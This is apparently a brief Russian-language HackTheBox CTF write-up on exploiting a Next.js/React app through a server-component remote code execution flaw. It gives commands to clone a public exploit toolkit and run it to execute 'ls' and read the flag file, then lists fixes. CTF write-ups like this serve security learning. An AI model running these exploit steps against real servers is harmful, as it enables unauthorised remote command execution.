# ReactOOPS (HTB) — mini write-up

> Только для HTB/CTF на разрешённой инфраструктуре.

## Что было
Next.js/React приложение оказалось уязвимо к **React2Shell (CVE-2025-55182)** → **RCE** через RSC/Flight.  
Флаг лежит внутри контейнера: **`/app/flag.txt`** → значит нужен `cat`, а не “покликать UI”.

## Дано
- Target: `http://<IP>:<PORT>`
- Архив: пароль `hackthebox`

## Эксплойт (самое главное)
Я использовал готовый набор скриптов `react2shell`.

```bash
git clone https://github.com/freeqaz/react2shell
cd react2shell
chmod +x *.sh
```

Проверка RCE:
```bash
./exploit-redirect.sh http://<IP>:<PORT> "ls"
```

Забрать флаг:
```bash
./exploit-redirect.sh -q http://<IP>:<PORT> "cat /app/flag.txt"
```

Флаг: `HTB{REDACTED}`

## Почему это сработало (коротко)
RSC/Flight endpoint принимал данные так, что их можно было превратить в выполнение команд на сервере.  
`ls` подтвердил контроль, `cat /app/flag.txt` — финал.

## Как бы это чинили
- обновить Next.js/React до версий с фиксом
- ограничить/закрыть RSC routes, если не нужны
- контейнер: non-root, read-only FS, минимум прав
